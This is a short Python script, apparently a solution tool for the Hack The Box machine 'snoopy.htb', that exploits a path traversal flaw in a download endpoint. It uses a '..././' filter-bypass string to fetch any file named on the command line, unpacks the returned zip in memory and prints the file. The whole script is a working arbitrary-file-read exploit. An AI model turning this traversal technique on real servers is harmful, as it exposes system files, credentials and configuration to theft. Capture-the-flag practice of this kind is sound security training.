import requests
import io
import sys
import zipfile

#print("hello")
def download(file):
    url = f'http://snoopy.htb/download?file=..././..././..././..././..././..././..././..././..././.../.{file}'
    r = requests.get(url)
    if len(r.content)==0:
        return None
    zip1 = io.BytesIO(r.content) #file is written to memory. no need to save
    with zipfile.ZipFile(zip1) as z:
        content = z.read(f"press_package{file}")
    return content.decode()

file = download(sys.argv[1])
if file:
    print(file)
